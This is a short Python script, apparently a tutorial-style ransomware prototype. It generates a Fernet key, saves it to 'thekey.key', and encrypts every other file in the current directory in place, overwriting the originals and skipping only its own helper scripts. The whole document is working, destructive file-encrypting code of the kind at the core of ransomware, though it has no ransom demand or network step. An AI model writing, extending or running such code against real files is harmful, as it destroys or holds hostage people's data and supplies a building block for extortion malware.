import time
import os
import math

from cryptography.fernet import Fernet
start_time = time.time()
files = []
for file in os.listdir():
    if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py" or file == "dummy.py":
        continue
    if os.path.isfile(file):
        files.append(file)

# print(files)


def convert_size(size_bytes):
   if size_bytes == 0:
       return "0B"
   size_name = ("B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB")
   i = int(math.floor(math.log(size_bytes, 1024)))
   p = math.pow(1024, i)
   s = round(size_bytes / p, 2)
   return "%s %s" % (s, size_name[i])

key = Fernet.generate_key()
print(key)

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    print(f"Encrypting {file} with size of {convert_size(os.stat(file).st_size)}...")
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)
        print(f"File {file} has been encrypted.")

print("All files have been encrypted.")
print(f"Exec time: {round((time.time() - start_time)/60)} minutes.")